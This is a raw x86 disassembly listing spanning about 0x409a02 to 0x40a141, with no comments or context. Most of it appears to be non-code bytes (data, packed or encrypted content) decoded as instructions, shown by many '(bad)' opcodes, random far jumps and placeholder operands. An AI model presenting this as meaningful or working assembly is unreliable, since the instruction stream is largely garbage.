  409a02:	add    BYTE PTR [eax],al
  409a04:	push   ds
  409a05:	outs   dx,BYTE PTR ds:[esi]
  409a06:	jg     0x409a04
  409a08:	xlat   BYTE PTR ds:[ebx]
  409a09:	sbb    al,BYTE PTR [eax]
  409a0b:	rol    BYTE PTR [eax],0x0
  409a0e:	mov    WORD PTR [ecx],?
  409a10:	add    BYTE PTR [eax],al
  409a12:	ss dec ebx
  409a14:	imul   esi,DWORD PTR [edi+eax*1-0x3d],0x56347441
  409a1c:	ja     0x409a42
  409a1e:	jae    0x409a76
  409a20:	pop    ebx
  409a21:	or     al,0x1b
  409a23:	add    BYTE PTR [eax],al
  409a25:	xor    dh,BYTE PTR [esi-0x51]
  409a28:	pop    esi
  409a29:	vpmacssdql xmm8,xmm3,xmm3,xmm5
  409a2f:	and    BYTE PTR [ebx-0xcdf88a7],cl
  409a35:	xchg   esi,eax
  409a36:	or     eax,0x3452075e
  409a3b:	sbb    edx,esi
  409a3d:	into   
  409a3e:	pop    ecx
  409a3f:	clc    
  409a40:	sub    DWORD PTR [edi-0x52],edi
  409a43:	jle    0x409a88
  409a45:	add    dh,BYTE PTR [esi]
  409a47:	scas   eax,DWORD PTR es:[edi]
  409a48:	or     DWORD PTR gs:[edx+ecx*1+0x0],ecx
  409a4d:	add    BYTE PTR [edx+0x3],dl
  409a50:	in     al,0xb3
  409a52:	(bad)  
  409a53:	cmp    al,0x8c
  409a55:	nop
  409a56:	add    BYTE PTR [eax],al
  409a58:	scas   al,BYTE PTR es:[edi]
  409a59:	and    DWORD PTR [ebp+0x4e7573e5],esi
  409a5f:	push   ds
  409a60:	out    dx,eax
  409a61:	mov    edi,0x58719103
  409a66:	imul   esp,DWORD PTR [ecx-0x74],0x24
  409a6a:	add    BYTE PTR [eax],al
  409a6c:	inc    ebp
  409a6d:	mov    esi,0x9d925210
  409a72:	ss push edx
  409a74:	or     dh,BYTE PTR [esi+0x710cf1]
  409a7a:	add    BYTE PTR [ebx-0x3f],dh
  409a7d:	jg     0x409a0d
  409a7f:	(bad)  
  409a80:	daa    
  409a81:	sbb    al,0x4b
  409a83:	inc    edi
  409a84:	cdq    
  409a85:	xchg   edx,eax
  409a86:	out    0xab,al
  409a88:	push   ecx
  409a89:	xor    ah,al
  409a8b:	jae    0x409a0f
  409a8d:	adc    dl,cl
  409a8f:	pop    ebx
  409a90:	dec    esi
  409a91:	mov    bl,0xd
  409a93:	or     edx,esi
  409a95:	fwait
  409a96:	pushf  
  409a97:	popa   
  409a98:	push   esi
  409a99:	cmp    eax,0x7df0c5f8
  409a9e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  409a9f:	out    0xdf,al
  409aa1:	stos   DWORD PTR es:[edi],eax
  409aa2:	lods   al,BYTE PTR ds:[esi]
  409aa3:	pushw  es
  409aa5:	cs stc 
  409aa7:	out    0xd8,al
  409aa9:	mov    esp,0x16336e28
  409aae:	icebp  
  409aaf:	or     eax,0xc38c02d8
  409ab4:	add    BYTE PTR [eax],al
  409ab6:	cmp    DWORD PTR [edx-0xf],edi
  409ab9:	dec    ebp
  409aba:	sbb    BYTE PTR [ecx-0x7efb3606],al
  409ac0:	add    BYTE PTR [eax],al
  409ac2:	mov    ecx,0x6f23e26
  409ac7:	xlat   BYTE PTR ds:[ebx]
  409ac8:	jb     0x409aa0
  409aca:	jno    0x409b16
  409acc:	pop    ecx
  409acd:	dec    ebx
  409ace:	fisub  WORD PTR [edx]
  409ad0:	aad    0xdb
  409ad2:	or     DWORD PTR [eax-0x24],0x0
  409ad6:	add    cl,bl
  409ad8:	mov    edx,0x8e160d5e
  409add:	std    
  409ade:	or     BYTE PTR [esi-0x5e5b0000],ah
  409ae4:	in     al,dx
  409ae5:	push   0x5e
  409ae7:	jecxz  0x409abe
  409ae9:	jo     0x409b46
  409aeb:	dec    esi
  409aec:	je     0x409abb
  409aee:	and    ch,BYTE PTR [eax+ecx*1]
  409af1:	sbb    DWORD PTR [eax],eax
  409af3:	add    BYTE PTR [esi+0x57],cl
  409af6:	sub    edi,esp
  409af8:	jbe    0x409b5b
  409afa:	adc    BYTE PTR [edx+0x26],al
  409afd:	inc    esp
  409afe:	dec    esp
  409aff:	add    BYTE PTR [eax],al
  409b01:	jge    0x409afe
  409b03:	or     esi,DWORD PTR ds:0xee9a0e42
  409b09:	mov    ch,0x5
  409b0b:	push   ebx
  409b0c:	xor    eax,esp
  409b0e:	push   ds
  409b0f:	je     0x409b0f
  409b11:	stos   DWORD PTR es:[edi],eax
  409b12:	or     eax,DWORD PTR [edx]
  409b14:	sti    
  409b15:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  409b16:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  409b17:	fwait
  409b18:	mov    eax,0x983ca39b
  409b1d:	adc    bl,BYTE PTR [ebx+0x49231530]
  409b23:	fs pop esp
  409b25:	jo     0x409b43
  409b27:	iret   
  409b28:	pop    edx
  409b29:	sub    ah,BYTE PTR [edx+0x3f]
  409b2c:	aam    0xd
  409b2e:	(bad)  
  409b2f:	adc    eax,edi
  409b31:	add    ebx,DWORD PTR [eax-0x3dfecb7e]
  409b37:	push   esi
  409b38:	aaa    
  409b39:	ror    BYTE PTR [esi-0x21fe9f89],1
  409b3f:	add    eax,0x29ebe916
  409b44:	sbb    BYTE PTR [edi],0xea
  409b47:	mov    cl,BYTE PTR [edi]
  409b49:	or     DWORD PTR [ecx],eax
  409b4b:	cld    
  409b4c:	sbb    al,0x3c
  409b4e:	rol    DWORD PTR [ebx+0x10],1
  409b51:	pop    ss
  409b52:	sub    BYTE PTR [eax+0x51],0x62
  409b56:	mov    bh,0xab
  409b58:	inc    ebp
  409b59:	shl    dl,1
  409b5b:	mov    ds:0x9525adf8,al
  409b60:	gs or  eax,0xd7a638f4
  409b66:	cmp    ebx,DWORD PTR [edx+eiz*8+0x21]
  409b6a:	xor    eax,0x5c00f9
  409b6f:	add    BYTE PTR [ebx+0x70],al
  409b72:	mov    bh,0x84
  409b74:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  409b75:	add    BYTE PTR [eax],al
  409b77:	cli    
  409b78:	fwait
  409b79:	enter  0x30,0x0
  409b7d:	imul   ecx,DWORD PTR [eax+0x5b000003],0xffffffba
  409b84:	sub    esp,DWORD PTR [eax+0x37]
  409b87:	xlat   BYTE PTR ds:[ebx]
  409b88:	sbb    ebp,ecx
  409b8a:	mov    bl,0x45
  409b8c:	xchg   ecx,eax
  409b8d:	pop    es
  409b8e:	outs   dx,BYTE PTR ds:[esi]
  409b8f:	ja     0x409b19
  409b91:	out    0x0,eax
  409b93:	add    BYTE PTR [edi+0x59],dh
  409b96:	cwde   
  409b97:	in     al,dx
  409b98:	sbb    bl,BYTE PTR [eax-0x2657326a]
  409b9e:	and    eax,0x7e5ac6bd
  409ba3:	aaa    
  409ba4:	(bad)  
  409ba5:	test   eax,0x23cdb286
  409baa:	rcl    DWORD PTR [edx-0x55],cl
  409bad:	and    BYTE PTR [edx-0x44],dh
  409bb0:	(bad)  [ebp-0x48c5f542]
  409bb6:	lods   al,BYTE PTR ds:[esi]
  409bb7:	loope  0x409b82
  409bb9:	clc    
  409bba:	mov    dh,BYTE PTR [eax+0xd]
  409bbd:	dec    esp
  409bbe:	pop    es
  409bbf:	add    BYTE PTR [eax],al
  409bc1:	les    esp,FWORD PTR [edx+0x0]
  409bc4:	add    BYTE PTR [ecx+eiz*1],ch
  409bc7:	sub    al,0x90
  409bc9:	xchg   edx,eax
  409bca:	(bad)  
  409bcc:	pop    eax
  409bcd:	jecxz  0x409be5
  409bcf:	and    al,BYTE PTR [ecx+0x34330d41]
  409bd5:	mov    eax,ds:0xee12c03
  409bda:	repz fiadd DWORD PTR [edx-0x57]
  409bde:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  409bdf:	test   DWORD PTR [eax],eax
  409be1:	push   edx
  409be2:	add    BYTE PTR [eax],al
  409be4:	pop    esp
  409be5:	(bad)  
  409be6:	out    dx,al
  409be7:	and    BYTE PTR [ebx+0x1b06b092],ch
  409bed:	ins    DWORD PTR es:[edi],dx
  409bee:	outs   dx,BYTE PTR ds:[esi]
  409bef:	mov    ?,WORD PTR ds:0xb08464
  409bf5:	add    BYTE PTR [esi+0x36e31bfa],al
  409bfb:	je     0x409c2c
  409bfd:	cmc    
  409bfe:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  409bff:	or     ch,BYTE PTR [edx-0x42]
  409c02:	mov    ebp,0x90dcd471
  409c07:	dec    ecx
  409c08:	outs   dx,DWORD PTR ds:[esi]
  409c09:	fld    QWORD PTR [edi-0x3f]
  409c0c:	shr    DWORD PTR [ebx-0x389b1724],0xa4
  409c13:	adc    bl,BYTE PTR [edx]
  409c15:	cmp    eax,0xbf9216b1
  409c1a:	push   es
  409c1b:	mov    edi,0x181fe262
  409c20:	inc    edi
  409c21:	adc    BYTE PTR [ebp+0xf9447e],al
  409c27:	add    dh,al
  409c29:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  409c2a:	jmp    0x6106acd9
  409c2f:	rol    bl,1
  409c31:	ss aad 0xfc
  409c34:	and    DWORD PTR [ebp+0x4],ecx
  409c37:	pop    es
  409c38:	add    BYTE PTR [eax],al
  409c3a:	and    BYTE PTR [ebx+0xf984],ch
  409c40:	jns    0x409bdf
  409c42:	out    0x65,al
  409c44:	jae    0x409c63
  409c46:	jg     0x409cae
  409c48:	pop    ebx
  409c49:	add    bh,0x0
  409c4c:	add    BYTE PTR [edx+0x331d1556],bl
  409c52:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  409c53:	ins    DWORD PTR es:[edi],dx
  409c54:	xchg   edi,eax
  409c55:	and    bl,BYTE PTR [ecx+0x40]
  409c58:	push   eax
  409c59:	add    BYTE PTR [eax],al
  409c5b:	fdiv   DWORD PTR [ebx]
  409c5d:	dec    edi
  409c5e:	ja     0x409c7f
  409c60:	sub    edi,edi
  409c62:	push   es
  409c63:	(bad)  
  409c64:	cmc    
  409c65:	pushf  
  409c66:	fcom   st(4)
  409c68:	repnz dec ebp
  409c6a:	mov    cx,0x582c
  409c6e:	scas   al,BYTE PTR es:[edi]
  409c6f:	or     DWORD PTR [esi+0x66],ecx
  409c72:	inc    eax
  409c73:	add    DWORD PTR [eax],0x0
  409c76:	xchg   cl,ch
  409c78:	mov    DWORD PTR [ebx+0x5a],esp
  409c7b:	xchg   esi,eax
  409c7c:	sti    
  409c7d:	xchg   ebp,eax
  409c7e:	jl     0x409ca2
  409c80:	inc    esi
  409c81:	push   0x816fecdf
  409c86:	int    0xd5
  409c88:	and    edi,DWORD PTR [eax]
  409c8a:	push   es
  409c8b:	pop    esi
  409c8c:	lods   al,BYTE PTR ds:[esi]
  409c8d:	lahf   
  409c8e:	mov    ss:0x7bd9498,al
  409c94:	ins    DWORD PTR es:[edi],dx
  409c95:	jb     0x409c5c
  409c97:	xchg   ebp,eax
  409c98:	adc    al,0xc5
  409c9a:	aas    
  409c9b:	aaa    
  409c9c:	fidivr DWORD PTR [esi-0x76f7a871]
  409ca2:	add    BYTE PTR [eax],al
  409ca4:	add    ch,cl
  409ca6:	and    esp,esi
  409ca8:	dec    edx
  409ca9:	mov    al,0x4e
  409cab:	push   di
  409cad:	(bad)  
  409cae:	sbb    ch,BYTE PTR [eax+edx*2+0x9]
  409cb2:	cwde   
  409cb3:	cmp    eax,0x9fa58f0d
  409cb8:	scas   al,BYTE PTR es:[edi]
  409cb9:	pop    edi
  409cba:	jae    0x409ccb
  409cbc:	and    ch,dh
  409cbe:	pop    ds
  409cbf:	stos   BYTE PTR es:[edi],al
  409cc0:	mov    edx,0x20a0de9
  409cc5:	or     al,0x46
  409cc7:	add    BYTE PTR [eax],al
  409cc9:	lahf   
  409cca:	loop   0x409ce7
  409ccc:	push   ss
  409ccd:	ds retf 0x7a75
  409cd1:	jle    0x409d1e
  409cd3:	ja     0x409cdf
  409cd5:	dec    edi
  409cd6:	es out 0x29,al
  409cd9:	adc    BYTE PTR [ebx+edx*4+0x22],bh
  409cdd:	dec    esp
  409cde:	in     eax,0x0
  409ce0:	add    BYTE PTR [edi-0xd],dl
  409ce3:	ds push ds
  409ce5:	mov    esp,0x14d43934
  409cea:	rep lods al,BYTE PTR ds:[esi]
  409cec:	shl    dl,1
  409cee:	push   edi
  409cef:	pop    ds
  409cf0:	mov    edi,0xbc4a9001
  409cf5:	pop    eax
  409cf6:	lods   al,BYTE PTR ds:[esi]
  409cf7:	jne    0x409cdc
  409cf9:	mov    al,0xd4
  409cfb:	stos   BYTE PTR es:[edi],al
  409cfc:	pop    es
  409cfd:	and    DWORD PTR [esi+0x18],edi
  409d00:	arpl   WORD PTR [eax-0x31],si
  409d03:	aaa    
  409d04:	imul   DWORD PTR [ecx-0x274ecb82]
  409d0a:	jmp    0xdc25:0x3e94fc53
  409d11:	addr16 test al,0x7c
  409d14:	xor    DWORD PTR [ebx],eax
  409d16:	xlat   BYTE PTR ds:[ebx]
  409d17:	or     ebx,esi
  409d19:	(bad)  
  409d1a:	mov    ecx,0x9040ea
  409d1f:	add    BYTE PTR [eax+0x61a9a9d],dl
  409d25:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  409d26:	push   ecx
  409d27:	dec    ecx
  409d28:	and    eax,0xd2df478e
  409d2d:	test   DWORD PTR [edx-0x38bc5b87],esi
  409d33:	lods   al,BYTE PTR ds:[esi]
  409d34:	mov    eax,ds:0x5e40
  409d39:	fcmovu st,st(6)
  409d3b:	minps  xmm2,xmm4
  409d3e:	sbb    cl,BYTE PTR [esi]
  409d40:	mov    dl,0xd
  409d42:	popa   
  409d43:	mov    esi,0xce964541
  409d48:	add    BYTE PTR [eax+eax*1-0x10c12a00],bh
  409d4f:	push   ebx
  409d50:	mov    WORD PTR [esi],?
  409d52:	add    BYTE PTR [eax],al
  409d54:	jb     0x409d96
  409d56:	int    0x0
  409d58:	add    BYTE PTR [eax-0x3802cca6],bh
  409d5e:	mov    esi,DWORD PTR [ecx-0x32e89004]
  409d64:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  409d65:	or     edi,DWORD PTR [esi]
  409d67:	push   si
  409d69:	mov    edx,0xb7f9d472
  409d6e:	pop    ecx
  409d6f:	ret    0xeff9
  409d72:	addr16 mov ebp,0xd10d19cf
  409d78:	fidiv  DWORD PTR [ecx+0xd9572f2]
  409d7e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  409d7f:	pushf  
  409d80:	out    dx,al
  409d81:	loop   0x409d8d
  409d83:	mov    dh,0x80
  409d85:	fadd   QWORD PTR [eax]
  409d87:	add    BYTE PTR [edi-0x13178e1d],bl
  409d8d:	or     DWORD PTR [ebp+0xf],eax
  409d90:	(bad)  
  409d91:	fld    DWORD PTR [eax]
  409d93:	add    BYTE PTR [edi+edi*1+0x0],cl
  409d97:	add    BYTE PTR [edx-0x5a2ebc62],al
  409d9d:	ins    DWORD PTR es:[edi],dx
  409d9e:	pop    edi
  409d9f:	fcom   QWORD PTR [eax+0x3d501e7a]
  409da5:	aaa    
  409da6:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  409da7:	(bad)  
  409da8:	mov    edx,0xef210506
  409dad:	outs   dx,DWORD PTR ds:[esi]
  409dae:	cmp    eax,ebx
  409db0:	jbe    0x409e28
  409db2:	and    BYTE PTR [edi+0x50],ch
  409db5:	mov    bh,0x12
  409db7:	ret    0xa97b
  409dba:	ror    dl,1
  409dbc:	or     BYTE PTR [edi+0x42410000],al
  409dc2:	dec    ebx
  409dc3:	sti    
  409dc4:	popf   
  409dc5:	fild   WORD PTR [ebp+0x683ba968]
  409dcc:	lahf   
  409dcd:	and    ah,dh
  409dcf:	cmp    eax,0x3baa793e
  409dd4:	mov    dh,0xe9
  409dd6:	(bad)  
  409dd7:	in     eax,dx
  409dd8:	add    BYTE PTR [eax],al
  409dda:	xchg   al,dl
  409ddc:	or     edi,DWORD PTR [edx]
  409dde:	sbb    BYTE PTR [eax-0x614d98bb],ch
  409de4:	fadd   st,st(3)
  409de6:	or     dl,BYTE PTR [eax+0x1e]
  409de9:	pop    ss
  409dea:	inc    esi
  409deb:	pop    es
  409dec:	adc    DWORD PTR [esp+eax*1+0x5b],esi
  409df0:	add    BYTE PTR [eax],al
  409df2:	fmul   DWORD PTR [eax+0x48000094]
  409df8:	mov    DWORD PTR [eax],0xb56b5200
  409dfe:	push   ecx
  409dff:	mov    ah,0xdc
  409e01:	rcl    DWORD PTR [eax+0x1b],0x4e
  409e05:	sar    BYTE PTR [edx+0x54e70000],0x17
  409e0c:	pusha  
  409e0d:	xor    ecx,esp
  409e0f:	int3   
  409e10:	cmp    BYTE PTR [eax],al
  409e12:	add    BYTE PTR [ebx],bh
  409e14:	int    0x6e
  409e16:	cmp    dh,BYTE PTR [edx-0x65]
  409e19:	xchg   edi,eax
  409e1a:	out    0xbb,eax
  409e1c:	push   edx
  409e1d:	push   ecx
  409e1e:	in     eax,0x53
  409e20:	dec    BYTE PTR gs:[ebx+eax*8]
  409e24:	add    BYTE PTR [eax],al
  409e26:	xchg   edi,eax
  409e27:	inc    edi
  409e28:	clc    
  409e29:	or     bh,BYTE PTR [edi]
  409e2b:	loop   0x409e1b
  409e2d:	add    ch,BYTE PTR [edx+0x58]
  409e30:	call   0x9b08:0x18dfa271
  409e37:	add    BYTE PTR [eax],al
  409e39:	clc    
  409e3a:	xor    DWORD PTR [ecx-0x64be6c19],esp
  409e40:	pop    eax
  409e41:	cmp    ecx,DWORD PTR ds:0x9f95a3b9
  409e47:	dec    edx
  409e48:	lods   al,BYTE PTR ds:[esi]
  409e49:	mov    dh,0x2d
  409e4b:	sbb    eax,0x18058ea4
  409e50:	int3   
  409e51:	test   al,0x0
  409e53:	add    BYTE PTR [eax+0xc089939],dl
  409e59:	add    BYTE PTR [eax],al
  409e5b:	leave  
  409e5c:	loop   0x409eb8
  409e5e:	cmp    eax,0x59758285
  409e63:	gs jo  0x409dfd
  409e66:	add    eax,0xe8c41d
  409e6b:	add    BYTE PTR [edi+0x5a],ch
  409e6e:	xchg   edx,eax
  409e6f:	mov    bl,0x46
  409e71:	icebp  
  409e72:	or     eax,0xa808e4bd
  409e77:	add    BYTE PTR [eax],al
  409e79:	push   esp
  409e7a:	sbb    esi,DWORD PTR [eax]
  409e7c:	je     0x409e03
  409e7e:	jae    0x409ef7
  409e80:	jmp    0xc6df:0x19be4ee7
  409e87:	push   ss
  409e88:	mov    edi,0xcd9a136d
  409e8d:	in     al,dx
  409e8e:	clc    
  409e8f:	xor    al,BYTE PTR [esi]
  409e91:	push   eax
  409e92:	sub    BYTE PTR [edi+0x7d1327da],ah
  409e98:	inc    ecx
  409e99:	sub    DWORD PTR [ebx-0x16],0x5f
  409e9d:	mov    cl,0x4b
  409e9f:	pop    edi
  409ea0:	xchg   edx,eax
  409ea1:	pop    ecx
  409ea2:	sub    BYTE PTR [eax+0xd],bl
  409ea5:	jmp    0x61344f1c
  409eaa:	je     0x409ef7
  409eac:	imul   DWORD PTR [ecx]
  409eae:	and    dh,BYTE PTR [esi-0x6a]
  409eb1:	add    BYTE PTR [ebp-0x6f6c0000],dl
  409eb7:	(bad)  
  409eb8:	icebp  
  409eb9:	mov    ch,0x30
  409ebb:	daa    
  409ebc:	out    dx,al
  409ebd:	add    cl,BYTE PTR [ebx]
  409ebf:	fdiv   DWORD PTR [ebp+0x184d093d]
  409ec5:	cmp    ch,BYTE PTR ds:0xc444cb
  409ecb:	add    cl,ah
  409ecd:	sub    ecx,DWORD PTR [edi]
  409ecf:	mov    edx,0xafae58c2
  409ed4:	fsubr  st(4),st
  409ed6:	stc    
  409ed7:	mov    cl,0xa7
  409ed9:	inc    esp
  409eda:	nop
  409edb:	add    BYTE PTR [eax],al
  409edd:	pop    ebp
  409ede:	inc    edi
  409edf:	xlat   BYTE PTR ds:[ebx]
  409ee0:	or     bl,BYTE PTR [ebp-0xb]
  409ee3:	gs fwait
  409ee5:	(bad)  
  409ee6:	lock add BYTE PTR [eax],al
  409ee9:	scas   al,BYTE PTR es:[edi]
  409eea:	adc    esp,DWORD PTR [ecx]
  409eec:	jnp    0x409f34
  409eee:	dec    eax
  409eef:	push   ebx
  409ef0:	add    BYTE PTR [eax],al
  409ef2:	loope  0x409ec9
  409ef4:	sub    eax,0xe872e77
  409ef9:	jbe    0x409eec
  409efb:	idiv   DWORD PTR [esi]
  409efd:	(bad)  
  409efe:	jb     0x409f2c
  409f00:	enter  0x8b,0x0
  409f04:	lods   al,BYTE PTR ds:[esi]
  409f05:	xchg   edi,eax
  409f06:	ficom  DWORD PTR [edi]
  409f08:	sub    edx,DWORD PTR [eax]
  409f0a:	rcl    ah,cl
  409f0c:	ret    0xc3ba
  409f0f:	push   es
  409f10:	or     dl,BYTE PTR [edi-0x6d]
  409f13:	lods   eax,DWORD PTR ds:[esi]
  409f14:	popf   
  409f15:	fld    DWORD PTR [ebp+0x218eb0cd]
  409f1b:	jmp    0x7e36:0x1eae8396
  409f22:	jg     0x409f6e
  409f24:	mov    al,BYTE PTR [eax-0x21ffff2d]
  409f2a:	jb     0x409ee6
  409f2c:	or     eax,0x8693b833
  409f31:	in     eax,0xe3
  409f33:	in     eax,dx
  409f34:	mov    al,ah
  409f36:	add    BYTE PTR [eax],al
  409f38:	ja     0x409f78
  409f3a:	jnp    0x409f8f
  409f3c:	inc    esp
  409f3d:	add    BYTE PTR fs:[eax],al
  409f40:	mov    ch,BYTE PTR [ebx-0x7f32fd60]
  409f46:	cmc    
  409f47:	add    BYTE PTR [eax],al
  409f49:	sub    DWORD PTR [ecx-0xc],edi
  409f4c:	sbb    esp,0x46
  409f4f:	sahf   
  409f50:	mul    BYTE PTR [edx+ecx*8+0xac48]
  409f57:	mov    ch,0x99
  409f59:	nop
  409f5a:	sti    
  409f5b:	xlat   BYTE PTR ds:[ebx]
  409f5c:	pop    ds
  409f5d:	sub    bh,0xd4
  409f60:	mul    bh
  409f62:	call   0xdf23:0xd4411302
  409f69:	xchg   eax,ecx
  409f6b:	pushf  
  409f6c:	add    BYTE PTR [eax],al
  409f6e:	in     al,dx
  409f6f:	lods   eax,DWORD PTR ds:[esi]
  409f70:	inc    esi
  409f71:	idiv   DWORD PTR [ecx+0x2dd0a68d]
  409f77:	mov    ah,0x41
  409f79:	sbb    cl,bl
  409f7b:	cmp    bl,BYTE PTR [edi-0x55642c3b]
  409f81:	retf   0xcbf4
  409f84:	pop    esp
  409f85:	mov    ds:0x893c158d,al
  409f8a:	(bad)
  409f8d:	mov    dh,0xef
  409f8f:	inc    edx
  409f90:	ds pop esi
  409f92:	dec    BYTE PTR [eax+edi*8]
  409f95:	add    BYTE PTR [eax],al
  409f97:	xor    DWORD PTR [edx],ebp
  409f99:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  409f9a:	push   ss
  409f9b:	inc    esi
  409f9c:	ds out 0xdb,eax
  409f9f:	pop    ebx
  409fa0:	xchg   esp,eax
  409fa1:	sub    DWORD PTR [eax+0x6a],eax
  409fa4:	add    BYTE PTR [eax],al
  409fa6:	or     eax,0x6bb85963
  409fab:	pop    ss
  409fac:	push   esi
  409fad:	dec    edx
  409fae:	pop    ebx
  409faf:	test   esp,0x8b00009b
  409fb5:	sbb    DWORD PTR [ecx+0x68],ebx
  409fb8:	call   0x75de:0xef1c87e6
  409fbf:	mov    eax,0x81aad1e0
  409fc4:	mov    esi,DWORD PTR [edi]
  409fc6:	fdivr  DWORD PTR [edx+eax*2]
  409fc9:	data16 ror BYTE PTR [esi+0xf580000],0x23
  409fd1:	test   eax,0x1adaaacd
  409fd6:	add    edx,eax
  409fd8:	mov    ds:0x23d99839,al
  409fdd:	mov    eax,ds:0x2300
  409fe2:	push   DWORD PTR fs:[edi]
  409fe5:	idiv   DWORD PTR [ecx+ecx*8]
  409fe8:	sti    
  409fe9:	mov    ebx,0xf8b36918
  409fee:	dec    ecx
  409fef:	mov    esp,0xb6f84e43
  409ff4:	test   esp,esp
  409ff6:	aad    0x18
  409ff8:	inc    ebx
  409ff9:	pop    eax
  409ffa:	in     al,dx
  409ffb:	inc    eax
  409ffc:	aam    0x0
  409ffe:	add    BYTE PTR [ecx-0x403ec36f],cl
  40a004:	stc    
  40a005:	stos   BYTE PTR es:[edi],al
  40a006:	pop    esp
  40a007:	out    0xcd,al
  40a009:	sahf   
  40a00a:	mov    al,0xfd
  40a00c:	mov    ebp,0x396bded4
  40a011:	js     0x409fa0
  40a013:	out    0x83,al
  40a015:	pop    ebp
  40a016:	cdq    
  40a017:	sub    DWORD PTR [edx-0x4b],ebp
  40a01a:	dec    esi
  40a01b:	or     eax,0x14e6a8e1
  40a020:	mov    bl,0x8b
  40a022:	fldenv [ebx+0x17]
  40a025:	loopne 0x40a08f
  40a027:	pusha  
  40a028:	pop    esi
  40a029:	push   edi
  40a02a:	mul    BYTE PTR [edx]
  40a02c:	mov    ch,0x70
  40a02e:	inc    eax
  40a02f:	jge    0x40a031
  40a031:	add    BYTE PTR [ecx+0x2c0825],ah
  40a037:	add    BYTE PTR [esi-0x47],bh
  40a03a:	pop    ebp
  40a03b:	jmp    0x409fdd
  40a03d:	dec    eax
  40a03e:	bound  eax,QWORD PTR [eax]
  40a040:	add    BYTE PTR [esi-0x25],dh
  40a043:	fnstsw WORD PTR [ecx+0x6]
  40a046:	(bad)  
  40a047:	js     0x40a099
  40a049:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40a04a:	stos   DWORD PTR es:[edi],eax
  40a04b:	or     esi,0xfffffffb
  40a04e:	push   ds
  40a04f:	sahf   
  40a050:	fwait
  40a051:	cdq    
  40a052:	ret    
  40a053:	mov    ah,0x43
  40a055:	dec    esi
  40a056:	mov    al,0xd1
  40a058:	loop   0x409fe6
  40a05a:	mov    eax,DWORD PTR [eax]
  40a05c:	add    BYTE PTR [edx+ebp*4],al
  40a05f:	add    BYTE PTR [eax],al
  40a061:	sub    BYTE PTR [esi-0x37790f2c],bl
  40a067:	or     DWORD PTR [eax],eax
  40a069:	add    cl,al
  40a06b:	dec    edi
  40a06c:	test   al,0xf6
  40a06e:	ins    DWORD PTR es:[edi],dx
  40a06f:	arpl   WORD PTR [ebp+0x3c],cx
  40a072:	pushf  
  40a073:	arpl   WORD PTR [eax],bx
  40a075:	cmc    
  40a076:	(bad)  
  40a077:	pop    ds
  40a078:	iret   
  40a079:	xor    esp,DWORD PTR [ebp+0x50c8ea]
  40a07f:	add    BYTE PTR [edx+0x6e],bl
  40a082:	or     BYTE PTR [eax-0x14c50000],al
  40a088:	xchg   edi,eax
  40a089:	leave  
  40a08a:	es inc edi
  40a08c:	jo     0x40a040
  40a08e:	fisubr WORD PTR [ebx+0x35773c14]
  40a094:	ret    0xac3d
  40a097:	lods   eax,DWORD PTR ds:[esi]
  40a098:	jecxz  0x40a03d
  40a09a:	scas   eax,DWORD PTR es:[edi]
  40a09b:	push   esi
  40a09c:	pusha  
  40a09d:	mov    eax,0xbcd9a70a
  40a0a2:	jge    0x40a07b
  40a0a4:	leave  
  40a0a5:	mov    ds:0x500074,eax
  40a0aa:	add    BYTE PTR [edx+ebp*2+0x16],ch
  40a0ae:	pop    edx
  40a0af:	test   BYTE PTR [ebx+0x34],0x14
  40a0b3:	fild   QWORD PTR [eax-0x49]
  40a0b6:	cmp    DWORD PTR [esi+0x6a],ecx
  40a0b9:	sbb    eax,DWORD PTR [ecx-0x5270fcae]
  40a0bf:	or     DWORD PTR [ebx+0x3c],0xe8566e11
  40a0c6:	dec    ebp
  40a0c7:	cld    
  40a0c8:	jb     0x40a092
  40a0ca:	push   ds
  40a0cb:	add    BYTE PTR [eax],al
  40a0cd:	mov    eax,ds:0x2f242f87
  40a0d2:	clc    
  40a0d3:	mov    eax,ds:0x4c5f49e4
  40a0d8:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40a0d9:	add    BYTE PTR [eax],al
  40a0db:	test   ebx,edi
  40a0dd:	inc    edi
  40a0de:	dec    edi
  40a0df:	lds    ebx,FWORD PTR [edx+0xa80cec]
  40a0e5:	add    BYTE PTR [esi-0xddc9588],bl
  40a0eb:	and    DWORD PTR [ebp+0xec8],edi
  40a0f1:	sbb    eax,0x3cbc6c43
  40a0f6:	mov    eax,ds:0x594c
  40a0fb:	or     eax,0x1deca0d0
  40a100:	mov    dl,0xd3
  40a102:	inc    ebx
  40a103:	stc    
  40a104:	jge    0x40a08e
  40a106:	outs   dx,DWORD PTR ds:[esi]
  40a107:	add    BYTE PTR [eax],al
  40a109:	das    
  40a10a:	or     DWORD PTR [ebx+0x2c],0xf
  40a10e:	sbb    dh,bl
  40a110:	mov    gs,edx
  40a112:	sbb    bl,BYTE PTR [edi+0x7a]
  40a115:	jle    0x40a0d4
  40a117:	outs   dx,BYTE PTR ds:[esi]
  40a118:	ss in  al,0x4b
  40a11b:	adc    al,0x9
  40a11d:	in     al,0x70
  40a11f:	in     eax,dx
  40a120:	nop
  40a121:	in     eax,dx
  40a122:	popf   
  40a123:	xchg   BYTE PTR [edx+0x4d],dh
  40a126:	cmp    dl,BYTE PTR ds:0xaa405293
  40a12c:	add    BYTE PTR [eax],al
  40a12e:	and    eax,DWORD PTR [eax-0x2c]
  40a131:	add    BYTE PTR [eax],al
  40a133:	loope  0x40a188
  40a135:	icebp  
  40a136:	inc    eax
  40a137:	data16 add BYTE PTR [eax],al
  40a13a:	jecxz  0x40a12c
  40a13c:	jno    0x40a153
  40a13e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40a13f:	popa   
  40a140:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40a141:	xchg   edx,eax
